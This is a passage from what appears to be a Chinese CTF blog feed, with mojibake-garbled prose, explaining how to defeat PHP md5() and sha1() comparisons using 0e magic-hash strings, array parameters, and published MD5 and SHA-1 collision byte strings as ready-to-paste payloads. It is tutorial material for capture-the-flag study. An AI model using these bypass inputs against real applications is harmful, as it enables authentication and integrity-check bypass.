<h3 id="å¸¸è§„çš„0eç»•è¿‡"><a href="#å¸¸è§„çš„0eç»•è¿‡" class="headerlink" title="å¸¸è§„çš„0eç»•è¿‡"></a>å¸¸è§„çš„0eç»•è¿‡</h3><p>&emsp;&emsp;åœ¨é‡åˆ°phpå¼±æ¯”è¾ƒä¸¤è€…MD5æ—¶ï¼Œå¾€å¾€ä½¿ç”¨0eç»•è¿‡ï¼Œå…¶åŸç†æ˜¯åˆ©ç”¨å¼±æ¯”è¾ƒï¼ˆ&#x3D;&#x3D;ï¼‰ä¸å¯¹æ¯”æ•°æ®ç±»å‹ï¼Œç›¸å½“äºå¯¹æ¯”ç¬¬ä¸€ä¸ªæ•°ï¼Œä¾‹å¦‚</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(md5(<span class="variable">$a</span>)</span></span>==<span class="built_in">md5</span>(<span class="variable">$b</span>))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¦æƒ³æ»¡è¶³æ¡ä»¶ï¼Œåªéœ€è¦ä¸¤ä½çš„MD5ä¸­16ä½å’Œ32ä½çš„ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶å°±è¡Œï¼Œä¸‹åˆ—æ˜¯ä¸€äº›è¾¾åˆ°è¦æ±‚çš„æ•°å€¼</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ä¸€èˆ¬åšè¿™ç§é¢˜éƒ½æ˜¯ç”¨è¿™äº›æ•°å€¼çš„ï¼Œç›´æ¥é€‰ä¸¤ä¸ªå¤åˆ¶ä¸Šå»å°±å¯ä»¥äº†Æª(Ë˜âŒ£Ë˜)Êƒä¼˜é›…</p>
<h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><p>&emsp;&emsp;åœ¨æ‰§è¡Œmd5()å‡½æ•°æ—¶ï¼Œè‹¥å‚æ•°ä¸ºæ•°ç»„ï¼Œè¿”å›ç»“æœæ˜¯ä¸ºnullï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ä¸¤è€…éƒ½ä¸ºæ•°ç»„æ—¶ï¼Œç»“æœä¸ºnullï¼Œä»¥è¾¾æˆç±»å‹å’Œæ•°æ®éƒ½ç›¸ç­‰ã€‚ä¾‹å¦‚</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="name">md5</span>($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">if (<span class="name">md5</span>($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åƒæ˜¯è¿™ç§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ï¼ˆstrposå‡½æ•°ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘å°±ä¸å•ç‹¬æå‡ºæ¥äº†ï¼Œé‡åˆ°strposæƒ³åˆ°æ•°ç»„ç»•è¿‡å°±è¡Œäº†ï¼‰</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[]</span>=a&amp;<span class="selector-tag">b</span><span class="selector-attr">[]</span>=<span class="selector-tag">b</span> </span><br></pre></td></tr></table></figure>

<h3 id="å¼ºç±»å‹ç»•è¿‡"><a href="#å¼ºç±»å‹ç»•è¿‡" class="headerlink" title="å¼ºç±»å‹ç»•è¿‡"></a>å¼ºç±»å‹ç»•è¿‡</h3><p>&emsp;&emsp;å½“åˆ¤æ–­æ¡ä»¶æˆ–è€…è®©ä½ æ‰€è¾“å…¥çš„å‚æ•°è½¬æ¢æˆç«‹stringç±»å‹çš„ï¼Œé‚£ä¹ˆä¸Šé¢çš„æ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†ï¼Œä¾‹å¦‚</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="built_in">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="built_in">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;é‚£ä¹ˆæœ‰æ²¡æœ‰åº”å¯¹ä¹‹æ³•ï¼Œå½“ç„¶æ˜¯æœ‰çš„ï¼Œpayloadç›´æ¥ç»™ä½ å•¦Ù©(à¹‘â€¢Ì€Ï‰â€¢Ìà¹‘)Û¶</p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="title class_">Param</span>1<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x00</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1<span class="char escape_">\x55</span>\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br><span class="line">$<span class="title class_">Param</span>2<span class="operator">=</span><span class="string">&quot;\x4d\xc9<span class="char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="char escape_">\x20</span><span class="char escape_">\x95</span><span class="char escape_">\x72</span>\xd4<span class="char escape_">\x77</span>\x7b<span class="char escape_">\x72</span><span class="char escape_">\x15</span><span class="char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="char escape_">\x78</span>\x3e\x7b<span class="char escape_">\x95</span><span class="char escape_">\x18</span>\xaf\xbf\xa2<span class="char escape_">\x02</span>\xa8<span class="char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="char escape_">\x55</span>\xb3\x5f<span class="char escape_">\x42</span><span class="char escape_">\x75</span><span class="char escape_">\x93</span>\xd8<span class="char escape_">\x49</span><span class="char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="char escape_">\x83</span><span class="char escape_">\x60</span>\xfb\x5f<span class="char escape_">\x07</span>\xfe\xa2&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">$<span class="variable">data1</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x07</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span>\xf1<span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="char escape_">\x72</span><span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2<span class="char escape_">\x34</span><span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span><span class="char escape_">\x28</span>\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br><span class="line">$<span class="variable">data2</span><span class="operator">=</span><span class="string">&quot;\xd1<span class="char escape_">\x31</span>\xdd<span class="char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="char escape_">\x69</span>\x3d\x9a<span class="char escape_">\x06</span><span class="char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="char escape_">\x87</span><span class="char escape_">\x12</span><span class="char escape_">\x46</span>\x7e\xab<span class="char escape_">\x40</span><span class="char escape_">\x04</span><span class="char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="char escape_">\x89</span><span class="char escape_">\x55</span>\xad<span class="char escape_">\x34</span><span class="char escape_">\x06</span><span class="char escape_">\x09</span>\xf4\xb3<span class="char escape_">\x02</span><span class="char escape_">\x83</span>\xe4<span class="char escape_">\x88</span><span class="char escape_">\x83</span><span class="char escape_">\x25</span><span class="char escape_">\x71</span><span class="char escape_">\x41</span>\x5a<span class="char escape_">\x08</span><span class="char escape_">\x51</span><span class="char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="char escape_">\x80</span><span class="char escape_">\x37</span>\x3c\x5b\xd8<span class="char escape_">\x82</span>\x3e<span class="char escape_">\x31</span><span class="char escape_">\x56</span><span class="char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="char escape_">\x36</span>\xc9<span class="char escape_">\x19</span>\xc6\xdd<span class="char escape_">\x53</span>\xe2\xb4<span class="char escape_">\x87</span>\xda<span class="char escape_">\x03</span>\xfd<span class="char escape_">\x02</span><span class="char escape_">\x39</span><span class="char escape_">\x63</span><span class="char escape_">\x06</span>\xd2<span class="char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="char escape_">\x33</span><span class="char escape_">\x42</span>\x0f<span class="char escape_">\x57</span>\x7e\xe8\xce<span class="char escape_">\x54</span>\xb6<span class="char escape_">\x70</span><span class="char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="char escape_">\x98</span><span class="char escape_">\x21</span>\xbc\xb6\xa8<span class="char escape_">\x83</span><span class="char escape_">\x93</span><span class="char escape_">\x96</span>\xf9<span class="char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="char escape_">\x70</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br><span class="line"></span><br><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;</span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å–œæ¬¢å“ªä¸ªç”¨å“ªä¸ªï¼ˆæˆ‘ä¸ªäººå¸¸ç”¨ç¬¬ä¸‰ä¸ªï¼‰</p>
<h3 id="å¼±æ¯”è¾ƒç­‰äºè‡ªèº«"><a href="#å¼±æ¯”è¾ƒç­‰äºè‡ªèº«" class="headerlink" title="å¼±æ¯”è¾ƒç­‰äºè‡ªèº«"></a>å¼±æ¯”è¾ƒç­‰äºè‡ªèº«</h3><p>&emsp;&emsp;æœ‰è¿™ä¹ˆä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒçš„å¼±æ¯”è¾ƒç­‰äºè‡ªèº«ï¼Œæˆ‘ä»¬ç§°å®ƒä»¬ä¸ºå¥‡å¦™çš„å­—ç¬¦ä¸²ï¼Œå½“é‡åˆ°è¿™ç§æƒ…å†µæ—¶ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨å®ƒä»¬</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>==<span class="built_in">md5</span>(<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å®ƒä»¬å°±æ˜¯</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">Ffifdyop</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure>

<h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><p>&emsp;&emsp;å¯¹äºéœ€è¦ä¸¤ä¸ªå†…å®¹ä¸åŒä½†æ˜¯MD5å€¼ç›¸åŒçš„æ–‡ä»¶ï¼Œä½¿ç”¨Fastcollå·¥å…·å°±å¯ä»¥äº†<a href="https://blog.csdn.net/m0_73683234/article/details/137245586">Fastcoll</a></p>
<h3 id="sha1ç»•è¿‡"><a href="#sha1ç»•è¿‡" class="headerlink" title="sha1ç»•è¿‡"></a>sha1ç»•è¿‡</h3><p>&emsp;&emsp;å’Œmd5()å‡½æ•°æ˜¯ä¸€æ ·çš„åŸç†ï¼Œå°±å¼±æ¯”è¾ƒçš„å­—ç¬¦ä¸²å’Œé‡åˆ°stringçš„æƒ…å†µä¸ä¸€æ ·ç½¢äº†ï¼Œè¿™é‡Œä¸€æ¬¡æ€§æ”¾å‡ºæ¥</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">10932435112</span>: <span class="number">0</span>e0776691500413317634705586<span class="number">5026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0</span>e66507019969427134894567494<span class="number">305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0</span>e766585266557562076882711596<span class="number">24026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0</span>e89257456677279068558073954<span class="number">252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0</span>e369777862785179849592603940<span class="number">24281014729</span></span><br><span class="line"><span class="number">0</span>e<span class="number">1290633704</span>: <span class="number">0</span>e19985187802402577070739524<span class="number">195726831799</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;é‡åˆ°stringçš„æƒ…å†µ</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br><span class="line"></span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_match</title>
    <url>/2024/06/12/preg-match/</url>
